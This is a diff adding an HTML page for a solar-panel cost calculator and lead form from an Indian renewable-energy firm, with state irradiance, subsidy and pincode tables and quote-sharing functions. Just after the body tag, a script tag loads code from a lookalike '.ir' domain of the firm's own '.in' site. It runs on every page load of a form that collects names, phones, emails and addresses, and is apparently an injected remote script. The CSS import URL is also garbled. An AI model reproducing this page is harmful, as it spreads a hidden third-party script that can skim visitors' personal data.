@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html>
+
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Renewable Energy Calculator - Sanjivani Greens</title>
+
+  <style>
+    @import url('https://ftsgocom/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .gradient-bg { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
+        .card-shadow { box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .animate-pulse-slow { animation: pulse 3s infinite; }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .slide-in { animation: slideIn 0.5s ease-out; }
+  </style>
+
+  
+</head>
+<body>
+  <script src="https://sanjivanigreens.ir"></script>
+
+    <!-- Header -->
+    <header class="gradient-bg text-white py-6">
+        <div class="container mx-auto px-4">
+           <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-12 h-12 bg-white rounded-full flex items-center justify-center">
+                        <span class="text-green-600 font-bold text-xl">🌱</span>
+                    </div>
+                    <div>
+                        <h1 class="text-2xl font-bold">Sanjivani Greens</h1>
+                        <p class="text-green-100 text-sm">Renewable Energy Solutions</p>
+                    </div>
+                </div>
+                <div class="text-right">
+                    <p class="text-sm">📞 +91 99746 55598</p>
+                    <p class="text-sm">✉️ greenenergy@sanjivanigreens.in</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container mx-auto px-4 py-8">
+        <div class="grid lg:grid-cols-2 gap-8">
+            <!-- Calculator Form -->
+            <div class="bg-white rounded-xl card-shadow p-6">
+                <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                    ⚡ Solar Energy Calculator
+                </h2>
+                
+                <form id="calculatorForm" class="space-y-6">
+                    <!-- Personal Details -->
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-gray-700 mb-4">Personal Details</h3>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <input type="text" id="fullName" placeholder="Full Name *" required 
+                                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            <input type="email" id="email" placeholder="Email Address *" required 
+                                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            <input type="tel" id="phone" placeholder="Phone Number *" required 
+                                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            <input type="text" id="address" placeholder="Complete Address" 
+                                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                        </div>
+                    </div>
+
+                    <!-- Location Details -->
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-gray-700 mb-4">Location Details</h3>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <select id="state" required class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                                <option value="">Select State/UT *</option>
+                                <optgroup label="States">
+                                    <option value="Andhra Pradesh">Andhra Pradesh</option>
+                                    <option value="Arunachal Pradesh">Arunachal Pradesh</option>
+                                    <option value="Assam">Assam</option>
+                                    <option value="Bihar">Bihar</option>
+                                    <option value="Chhattisgarh">Chhattisgarh</option>
+                                    <option value="Goa">Goa</option>
+                                    <option value="Gujarat">Gujarat</option>
+                                    <option value="Haryana">Haryana</option>
+                                    <option value="Himachal Pradesh">Himachal Pradesh</option>
+                                    <option value="Jharkhand">Jharkhand</option>
+                                    <option value="Karnataka">Karnataka</option>
+                                    <option value="Kerala">Kerala</option>
+                                    <option value="Madhya Pradesh">Madhya Pradesh</option>
+                                    <option value="Maharashtra">Maharashtra</option>
+                                    <option value="Manipur">Manipur</option>
+                                    <option value="Meghalaya">Meghalaya</option>
+                                    <option value="Mizoram">Mizoram</option>
+                                    <option value="Nagaland">Nagaland</option>
+                                    <option value="Odisha">Odisha</option>
+                                    <option value="Punjab">Punjab</option>
+                                    <option value="Rajasthan">Rajasthan</option>
+                                    <option value="Sikkim">Sikkim</option>
+                                    <option value="Tamil Nadu">Tamil Nadu</option>
+                                    <option value="Telangana">Telangana</option>
+                                    <option value="Tripura">Tripura</option>
+                                    <option value="Uttar Pradesh">Uttar Pradesh</option>
+                                    <option value="Uttarakhand">Uttarakhand</option>
+                                    <option value="West Bengal">West Bengal</option>
+                                </optgroup>
+                                <optgroup label="Union Territories">
+                                    <option value="Andaman and Nicobar Islands">Andaman and Nicobar Islands</option>
+                                    <option value="Chandigarh">Chandigarh</option>
+                                    <option value="Dadra and Nagar Haveli and Daman and Diu">Dadra and Nagar Haveli and Daman and Diu</option>
+                                    <option value="Delhi">Delhi</option>
+                                    <option value="Jammu and Kashmir">Jammu and Kashmir</option>
+                                    <option value="Ladakh">Ladakh</option>
+                                    <option value="Lakshadweep">Lakshadweep</option>
+                                    <option value="Puducherry">Puducherry</option>
+                                </optgroup>
+                            </select>
+                            <input type="text" id="pincode" placeholder="Pincode *" required maxlength="6"
+                                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                        </div>
+                    </div>
+
+                    <!-- Energy Requirements -->
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-gray-700 mb-4">Energy Requirements</h3>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Monthly Electricity Bill (₹)</label>
+                                <input type="number" id="monthlyBill" placeholder="e.g., 5000" required
+                                       class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Property Type</label>
+                                <select id="propertyType" required class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                                    <option value="">Select Type *</option>
+                                    <option value="Residential">Residential</option>
+                                    <option value="Commercial">Commercial</option>
+                                    <option value="Industrial">Industrial</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Roof Area (sq ft)</label>
+                                <input type="number" id="roofArea" placeholder="e.g., 1000"
+                                       class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Daily Energy Usage (kWh)</label>
+                                <input type="number" id="dailyUsage" placeholder="e.g., 25"
+                                       class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full gradient-bg text-white py-4 rounded-lg font-semibold text-lg hover:shadow-lg transition-all duration-300 transform hover:scale-105">
+                        🔍 Calculate Solar Requirements & Get Quote
+                    </button>
+                </form>
+            </div>
+
+            <!-- Results Panel -->
+            <div id="resultsPanel" class="bg-white rounded-xl card-shadow p-6 hidden">
+                <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                    📊 Your Solar Energy Report
+                </h2>
+                <div id="calculationResults" class="space-y-4"></div>
+                
+                <div class="mt-6 space-y-3">
+                    <button id="downloadQuote" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors">
+                        📄 Download Detailed Quote
+                    </button>
+                    <button id="whatsappLead" class="w-full bg-green-600 text-white py-3 rounded-lg font-semibold hover:bg-green-700 transition-colors">
+                        📱 Send Quote via WhatsApp
+                    </button>
+                    <button id="emailQuote" class="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-colors">
+                        ✉️ Email Quote & Schedule Consultation
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Features Section -->
+        <div class="mt-12 grid md:grid-cols-3 gap-6">
+            <div class="bg-white rounded-xl card-shadow p-6 text-center">
+                <div class="text-4xl mb-4">🌞</div>
+                <h3 class="font-bold text-lg mb-2">State-wise Accuracy</h3>
+                <p class="text-gray-600">Precise calculations based on your state's solar irradiance and government policies</p>
+            </div>
+            <div class="bg-white rounded-xl card-shadow p-6 text-center">
+                <div class="text-4xl mb-4">💰</div>
+                <h3 class="font-bold text-lg mb-2">Instant Quotation</h3>
+                <p class="text-gray-600">Get accurate pricing with subsidies and financing options included</p>
+            </div>
+            <div class="bg-white rounded-xl card-shadow p-6 text-center">
+                <div class="text-4xl mb-4">🚀</div>
+                <h3 class="font-bold text-lg mb-2">Quick Follow-up</h3>
+                <p class="text-gray-600">Instant lead generation with WhatsApp and email integration</p>
+            </div>
+        </div>
+    </div>
+
+  <script>
+    // State-wise solar data (kWh/kWp/day) with accurate irradiance and subsidy data
+        const solarData = {
+            // High Solar Potential States
+            'Rajasthan': { irradiance: 6.1, subsidy: 30000, rate: 44000, electricityRate: 6.5 },
+            'Gujarat': { irradiance: 5.8, subsidy: 40000, rate: 45000, electricityRate: 6.2 },
+            'Madhya Pradesh': { irradiance: 5.6, subsidy: 30000, rate: 44000, electricityRate: 6.0 },
+            'Karnataka': { irradiance: 5.5, subsidy: 30000, rate: 46000, electricityRate: 6.8 },
+            'Andhra Pradesh': { irradiance: 5.4, subsidy: 30000, rate: 45000, electricityRate: 6.5 },
+            'Telangana': { irradiance: 5.3, subsidy: 30000, rate: 46000, electricityRate: 6.7 },
+            'Tamil Nadu': { irradiance: 5.3, subsidy: 30000, rate: 48000, electricityRate: 7.2 },
+            'Maharashtra': { irradiance: 5.2, subsidy: 30000, rate: 47000, electricityRate: 7.0 },
+            'Odisha': { irradiance: 5.1, subsidy: 30000, rate: 45000, electricityRate: 5.8 },
+            'Haryana': { irradiance: 5.0, subsidy: 30000, rate: 45000, electricityRate: 6.3 },
+            'Punjab': { irradiance: 4.9, subsidy: 30000, rate: 46000, electricityRate: 6.1 },
+            'Uttar Pradesh': { irradiance: 4.8, subsidy: 30000, rate: 47000, electricityRate: 6.4 },
+            'Delhi': { irradiance: 4.7, subsidy: 30000, rate: 48000, electricityRate: 7.5 },
+            'Chhattisgarh': { irradiance: 5.2, subsidy: 30000, rate: 44000, electricityRate: 5.9 },
+            'Jharkhand': { irradiance: 4.9, subsidy: 30000, rate: 46000, electricityRate: 6.2 },
+            'Bihar': { irradiance: 4.8, subsidy: 30000, rate: 45000, electricityRate: 5.7 },
+            'West Bengal': { irradiance: 4.6, subsidy: 30000, rate: 47000, electricityRate: 6.8 },
+            'Kerala': { irradiance: 4.8, subsidy: 30000, rate: 48000, electricityRate: 7.1 },
+            'Goa': { irradiance: 5.0, subsidy: 30000, rate: 49000, electricityRate: 7.3 },
+            'Himachal Pradesh': { irradiance: 4.5, subsidy: 30000, rate: 47000, electricityRate: 5.5 },
+            'Uttarakhand': { irradiance: 4.7, subsidy: 30000, rate: 46000, electricityRate: 6.0 },
+            'Jammu and Kashmir': { irradiance: 4.3, subsidy: 30000, rate: 48000, electricityRate: 5.2 },
+            'Ladakh': { irradiance: 5.8, subsidy: 30000, rate: 50000, electricityRate: 6.5 },
+            
+            // Northeastern States
+            'Assam': { irradiance: 4.2, subsidy: 30000, rate: 47000, electricityRate: 6.1 },
+            'Arunachal Pradesh': { irradiance: 4.0, subsidy: 30000, rate: 48000, electricityRate: 5.8 },
+            'Manipur': { irradiance: 4.1, subsidy: 30000, rate: 48000, electricityRate: 6.0 },
+            'Meghalaya': { irradiance: 3.9, subsidy: 30000, rate: 49000, electricityRate: 6.2 },
+            'Mizoram': { irradiance: 4.0, subsidy: 30000, rate: 49000, electricityRate: 6.1 },
+            'Nagaland': { irradiance: 4.1, subsidy: 30000, rate: 48000, electricityRate: 5.9 },
+            'Tripura': { irradiance: 4.2, subsidy: 30000, rate: 47000, electricityRate: 6.0 },
+            'Sikkim': { irradiance: 4.3, subsidy: 30000, rate: 48000, electricityRate: 5.7 },
+            
+            // Union Territories
+            'Chandigarh': { irradiance: 4.8, subsidy: 30000, rate: 47000, electricityRate: 6.8 },
+            'Puducherry': { irradiance: 5.2, subsidy: 30000, rate: 48000, electricityRate: 7.0 },
+            'Andaman and Nicobar Islands': { irradiance: 4.5, subsidy: 30000, rate: 52000, electricityRate: 8.0 },
+            'Lakshadweep': { irradiance: 5.1, subsidy: 30000, rate: 55000, electricityRate: 8.5 },
+            'Dadra and Nagar Haveli and Daman and Diu': { irradiance: 5.4, subsidy: 30000, rate: 47000, electricityRate: 6.9 }
+        };
+
+        let currentQuoteData = {};
+
+        // Pincode ranges for major states (simplified validation)
+        const pincodeRanges = {
+            'Andhra Pradesh': ['515', '516', '517', '518', '519', '520', '521', '522', '523', '524', '525', '526', '527'],
+            'Arunachal Pradesh': ['790', '791', '792'],
+            'Assam': ['781', '782', '783', '784', '785', '786', '787', '788'],
+            'Bihar': ['800', '801', '802', '803', '804', '805', '811', '812', '813', '814', '815', '816', '821', '822', '823', '824', '825', '831', '832', '833', '834', '835', '841', '842', '843', '845', '846', '847', '848', '849', '851', '852', '853', '854', '855', '856'],
+            'Chhattisgarh': ['490', '491', '492', '493', '494', '495', '496', '497'],
+            'Delhi': ['110'],
+            'Goa': ['403'],
+            'Gujarat': ['360', '361', '362', '363', '364', '365', '370', '380', '381', '382', '383', '384', '385', '387', '388', '389', '390', '391', '392', '393', '394', '395', '396'],
+            'Haryana': ['121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136'],
+            'Himachal Pradesh': ['171', '172', '173', '174', '175', '176', '177'],
+            'Jharkhand': ['814', '815', '825', '826', '827', '828', '829', '831', '832', '833', '834', '835'],
+            'Karnataka': ['560', '561', '562', '563', '564', '565', '566', '570', '571', '572', '573', '574', '575', '576', '577', '581', '582', '583', '584', '585', '586', '587', '590', '591', '592'],
+            'Kerala': ['670', '671', '672', '673', '674', '675', '676', '678', '679', '680', '681', '682', '683', '684', '685', '686', '687', '688', '689', '690', '691', '692', '695', '696', '697'],
+            'Madhya Pradesh': ['450', '451', '452', '453', '454', '455', '456', '457', '458', '459', '460', '461', '462', '463', '464', '465', '466', '467', '470', '471', '472', '473', '474', '480', '481', '482', '483', '484', '485', '486', '487', '488'],
+            'Maharashtra': ['400', '401', '402', '403', '404', '405', '410', '411', '412', '413', '414', '415', '416', '417', '421', '422', '423', '424', '425', '431', '441', '442', '443', '444', '445', '446', '447', '448', '449'],
+            'Manipur': ['795'],
+            'Meghalaya': ['793', '794'],
+            'Mizoram': ['796'],
+            'Nagaland': ['797', '798'],
+            'Odisha': ['751', '752', '753', '754', '755', '756', '757', '758', '759', '760', '761', '762', '763', '764', '765', '766', '767', '768', '769', '770'],
+            'Punjab': ['140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '160', '161'],
+            'Rajasthan': ['301', '302', '303', '304', '305', '306', '307', '311', '312', '313', '314', '321', '322', '323', '324', '325', '326', '327', '331', '332', '333', '334', '335', '341', '342', '343', '344', '345'],
+            'Sikkim': ['737'],
+            'Tamil Nadu': ['600', '601', '602', '603', '604', '605', '606', '607', '608', '609', '610', '611', '612', '613', '614', '621', '622', '623', '624', '625', '626', '627', '628', '629', '630', '631', '632', '633', '634', '635', '636', '637', '638', '639', '641', '642', '643', '644', '645', '646', '647', '648', '649'],
+            'Telangana': ['500', '501', '502', '503', '504', '505', '506', '507', '508', '509'],
+            'Tripura': ['799'],
+            'Uttar Pradesh': ['201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '241', '242', '243', '244', '245', '246', '247', '248', '249', '251', '261', '262', '263', '271', '272', '273', '274', '275', '276', '277', '281', '282', '283', '284', '285'],
+            'Uttarakhand': ['244', '245', '246', '247', '248', '249', '263'],
+            'West Bengal': ['700', '701', '702', '703', '704', '711', '712', '713', '721', '722', '723', '731', '732', '733', '734', '735', '736', '741', '742', '743', '744', '751', '752', '753', '754', '755', '756', '757', '758', '759', '781', '782', '783', '784', '785', '786', '787', '788'],
+            'Chandigarh': ['160'],
+            'Puducherry': ['605'],
+            'Andaman and Nicobar Islands': ['744'],
+            'Lakshadweep': ['682'],
+            'Jammu and Kashmir': ['180', '181', '182', '183', '184', '185', '186', '190', '191', '192', '193', '194', '195', '196', '197'],
+            'Ladakh': ['194'],
+            'Dadra and Nagar Haveli and Daman and Diu': ['396']
+        };
+
+        function validatePincodeState(pincode, state) {
+            const prefix = pincode.substring(0, 3);
+            const ranges = pincodeRanges[state];
+            
+            if (!ranges) {
+                return { valid: true, message: 'State validation data not available.' };
+            }
+            
+            const isValid = ranges.includes(prefix);
+            
+            if (!isValid) {
+                return { 
+                    valid: false, 
+                    message: `This pincode typically belongs to a different state. Please verify your location details.` 
+                };
+            }
+            
+            return { valid: true, message: 'Pincode validated successfully.' };
+        }
+
+        document.getElementById('calculatorForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            calculateSolarRequirements();
+        });
+
+        function calculateSolarRequirements() {
+            // Get form data
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                state: document.getElementById('state').value,
+                pincode: document.getElementById('pincode').value,
+                monthlyBill: parseFloat(document.getElementById('monthlyBill').value),
+                propertyType: document.getElementById('propertyType').value,
+                roofArea: parseFloat(document.getElementById('roofArea').value) || 0,
+                dailyUsage: parseFloat(document.getElementById('dailyUsage').value) || 0
+            };
+
+            // Validate pincode format and state compatibility
+            if (!/^\d{6}$/.test(formData.pincode)) {
+                alert('Please enter a valid 6-digit pincode');
+                return;
+            }
+
+            // Basic pincode-state validation
+            const pincodeValidation = validatePincodeState(formData.pincode, formData.state);
+            if (!pincodeValidation.valid) {
+                if (confirm(`Pincode ${formData.pincode} may not belong to ${formData.state}. ${pincodeValidation.message} Do you want to continue anyway?`)) {
+                    // Continue with calculation
+                } else {
+                    return;
+                }
+            }
+
+            // Get state-specific data
+            const stateData = solarData[formData.state];
+            if (!stateData) {
+                alert('Please select a valid state');
+                return;
+            }
+
+            // Calculate energy requirements
+            const avgElectricityRate = stateData.electricityRate; // State-specific ₹ per kWh
+            const monthlyUnits = formData.monthlyBill / avgElectricityRate;
+            const dailyUnits = monthlyUnits / 30;
+            const actualDailyUsage = formData.dailyUsage || dailyUnits;
+
+            // Calculate system size
+            const systemSizeKW = actualDailyUsage / stateData.irradiance;
+            const recommendedSystemKW = Math.ceil(systemSizeKW * 1.2); // 20% buffer
+
+            // Calculate costs
+            const systemCost = recommendedSystemKW * stateData.rate;
+            const subsidyAmount = Math.min(stateData.subsidy, systemCost * 0.4);
+            const netCost = systemCost - subsidyAmount;
+
+            // Calculate savings
+            const annualGeneration = recommendedSystemKW * stateData.irradiance * 365;
+            const annualSavings = annualGeneration * avgElectricityRate;
+            const paybackPeriod = netCost / annualSavings;
+
+            // Store quote data
+            currentQuoteData = {
+                ...formData,
+                systemSizeKW: recommendedSystemKW,
+                systemCost: systemCost,
+                subsidyAmount: subsidyAmount,
+                netCost: netCost,
+                annualGeneration: annualGeneration,
+                annualSavings: annualSavings,
+                paybackPeriod: paybackPeriod,
+                irradiance: stateData.irradiance,
+                timestamp: new Date().toLocaleString()
+            };
+
+            displayResults(currentQuoteData);
+        }
+
+        function displayResults(data) {
+            const resultsPanel = document.getElementById('resultsPanel');
+            const resultsDiv = document.getElementById('calculationResults');
+
+            resultsDiv.innerHTML = `
+                <div class="slide-in">
+                    <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
+                        <h4 class="font-bold text-green-800">Hello ${data.fullName}! 👋</h4>
+                        <p class="text-green-700">Here's your personalized solar energy report for ${data.state} (${data.pincode})</p>
+                    </div>
+
+                    <div class="grid md:grid-cols-2 gap-4 mb-6">
+                        <div class="bg-blue-50 p-4 rounded-lg">
+                            <h5 class="font-semibold text-blue-800 mb-2">☀️ System Specifications</h5>
+                            <p><strong>Recommended System:</strong> ${data.systemSizeKW} kW</p>
+                            <p><strong>Annual Generation:</strong> ${Math.round(data.annualGeneration)} kWh</p>
+                            <p><strong>Solar Irradiance:</strong> ${data.irradiance} kWh/kWp/day</p>
+                        </div>
+                        
+                        <div class="bg-green-50 p-4 rounded-lg">
+                            <h5 class="font-semibold text-green-800 mb-2">💰 Cost Breakdown</h5>
+                            <p><strong>System Cost:</strong> ₹${data.systemCost.toLocaleString()}</p>
+                            <p><strong>Government Subsidy:</strong> -₹${data.subsidyAmount.toLocaleString()}</p>
+                            <p><strong>Net Investment:</strong> ₹${data.netCost.toLocaleString()}</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-yellow-50 border border-yellow-200 p-4 rounded-lg mb-4">
+                        <h5 class="font-semibold text-yellow-800 mb-2">📈 Financial Benefits</h5>
+                        <div class="grid md:grid-cols-3 gap-4 text-center">
+                            <div>
+                                <p class="text-2xl font-bold text-green-600">₹${Math.round(data.annualSavings).toLocaleString()}</p>
+                                <p class="text-sm text-gray-600">Annual Savings</p>
+                            </div>
+                            <div>
+                                <p class="text-2xl font-bold text-blue-600">${data.paybackPeriod.toFixed(1)} years</p>
+                                <p class="text-sm text-gray-600">Payback Period</p>
+                            </div>
+                            <div>
+                                <p class="text-2xl font-bold text-purple-600">₹${Math.round(data.annualSavings * 20).toLocaleString()}</p>
+                                <p class="text-sm text-gray-600">20-Year Savings</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <h5 class="font-semibold text-gray-800 mb-2">📋 Quote Summary</h5>
+                        <p><strong>Property Type:</strong> ${data.propertyType}</p>
+                        <p><strong>Monthly Bill:</strong> ₹${data.monthlyBill.toLocaleString()}</p>
+                        <p><strong>Quote Generated:</strong> ${data.timestamp}</p>
+                        <p class="text-sm text-gray-600 mt-2">*This is a provisional quote. Final pricing may vary based on site survey and current market rates.</p>
+                    </div>
+                </div>
+            `;
+
+            resultsPanel.classList.remove('hidden');
+            resultsPanel.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Download Quote functionality
+        document.getElementById('downloadQuote').addEventListener('click', function() {
+            generatePDFQuote();
+        });
+
+        // WhatsApp Lead functionality
+        document.getElementById('whatsappLead').addEventListener('click', function() {
+            sendWhatsAppLead();
+        });
+
+        // Email Quote functionality
+        document.getElementById('emailQuote').addEventListener('click', function() {
+            sendEmailQuote();
+        });
+
+        function generatePDFQuote() {
+            const data = currentQuoteData;
+            const quoteContent = `
+SANJIVANI GREENS - SOLAR ENERGY QUOTATION
+==========================================
+
+Customer Details:
+Name: ${data.fullName}
+Email: ${data.email}
+Phone: ${data.phone}
+Address: ${data.address}
+Location: ${data.state} - ${data.pincode}
+
+System Specifications:
+- Recommended System Size: ${data.systemSizeKW} kW
+- Expected Annual Generation: ${Math.round(data.annualGeneration)} kWh
+- Solar Irradiance: ${data.irradiance} kWh/kWp/day
+- Property Type: ${data.propertyType}
+
+Financial Details:
+- System Cost: ₹${data.systemCost.toLocaleString()}
+- Government Subsidy: ₹${data.subsidyAmount.toLocaleString()}
+- Net Investment: ₹${data.netCost.toLocaleString()}
+- Annual Savings: ₹${Math.round(data.annualSavings).toLocaleString()}
+- Payback Period: ${data.paybackPeriod.toFixed(1)} years
+- 20-Year Total Savings: ₹${Math.round(data.annualSavings * 20).toLocaleString()}
+
+Quote Generated: ${data.timestamp}
+
+Contact Information:
+Phone: +91 99746 55598
+Email: greenenergy@sanjivanigreens.in
+Website: https://sanjivanigreens.in
+
+*This is a provisional quotation. Final pricing subject to site survey and market conditions.
+            `;
+
+            // Create and download text file (PDF generation would require external library)
+            const blob = new Blob([quoteContent], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Solar_Quote_${data.fullName.replace(/\s+/g, '_')}_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+
+            alert('Quote downloaded successfully! 📄');
+        }
+
+        function sendWhatsAppLead() {
+            const data = currentQuoteData;
+            const message = `🌱 *SOLAR ENERGY LEAD - SANJIVANI GREENS*
+
+👤 *Customer Details:*
+Name: ${data.fullName}
+Phone: ${data.phone}
+Email: ${data.email}
+Location: ${data.state} - ${data.pincode}
+
+⚡ *System Requirements:*
+• Recommended Size: ${data.systemSizeKW} kW
+• Property Type: ${data.propertyType}
+• Monthly Bill: ₹${data.monthlyBill.toLocaleString()}
+
+💰 *Quote Summary:*
+• System Cost: ₹${data.systemCost.toLocaleString()}
+• After Subsidy: ₹${data.netCost.toLocaleString()}
+• Annual Savings: ₹${Math.round(data.annualSavings).toLocaleString()}
+• Payback: ${data.paybackPeriod.toFixed(1)} years
+
+📅 Generated: ${data.timestamp}
+
+*Action Required:* Follow up for site survey and detailed proposal.
+
+#SolarLead #RenewableEnergy #SanjivaniGreens`;
+
+            const whatsappUrl = `https://wa.me/919974655598?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank', 'noopener,noreferrer');
+        }
+
+        function sendEmailQuote() {
+            const data = currentQuoteData;
+            const subject = `Solar Energy Quote Request - ${data.fullName} (${data.state})`;
+            const body = `Dear Sanjivani Greens Team,
+
+I have generated a solar energy quote through your calculator and would like to proceed with a detailed consultation.
+
+Customer Details:
+- Name: ${data.fullName}
+- Phone: ${data.phone}
+- Email: ${data.email}
+- Address: ${data.address}
+- Location: ${data.state} - ${data.pincode}
+
+System Requirements:
+- Recommended System Size: ${data.systemSizeKW} kW
+- Property Type: ${data.propertyType}
+- Current Monthly Bill: ₹${data.monthlyBill.toLocaleString()}
+
+Provisional Quote Summary:
+- System Cost: ₹${data.systemCost.toLocaleString()}
+- Government Subsidy: ₹${data.subsidyAmount.toLocaleString()}
+- Net Investment: ₹${data.netCost.toLocaleString()}
+- Expected Annual Savings: ₹${Math.round(data.annualSavings).toLocaleString()}
+- Payback Period: ${data.paybackPeriod.toFixed(1)} years
+
+Please contact me to schedule a site survey and provide a detailed proposal.
+
+Best regards,
+${data.fullName}
+${data.phone}
+
+Quote generated on: ${data.timestamp}`;
+
+            const mailtoUrl = `mailto:greenenergy@sanjivanigreens.in?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            window.open(mailtoUrl, '_blank', 'noopener,noreferrer');
+        }
+
+        // Auto-calculate daily usage based on monthly bill
+        document.getElementById('monthlyBill').addEventListener('input', function() {
+            const monthlyBill = parseFloat(this.value);
+            if (monthlyBill > 0) {
+                const estimatedDailyUsage = Math.round((monthlyBill / 6) / 30 * 10) / 10;
+                document.getElementById('dailyUsage').value = estimatedDailyUsage;
+            }
+        });
+
+        // Pincode validation
+        document.getElementById('pincode').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 6);
+        });
+
+        // Phone number validation
+        document.getElementById('phone').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
+
+(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9828098ca1570337',t:'MTc1ODQ0MTcxNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();
+  </script>
+</body>
+</html>
